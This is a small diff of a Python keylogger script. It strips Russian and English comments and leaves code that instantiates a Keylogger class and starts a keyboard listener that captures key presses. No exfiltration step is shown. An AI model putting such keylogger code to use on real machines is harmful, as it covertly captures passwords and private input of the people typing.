@@ -8,7 +8,6 @@ from datetime import datetime
 from dataclasses import dataclass
 
 
-# Это как пример
 class Processor:
     def __init__(self):
         eng_chars = "~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
@@ -86,8 +85,7 @@ class Keylogger:
         return key
 
 
-# Вот пример как работать с классами
-keylogger = Keylogger()  # New class instance
+keylogger = Keylogger()
 with Listener(on_press=keylogger.on_press, on_release=keylogger.on_release) as listener:
     listener.join()
 
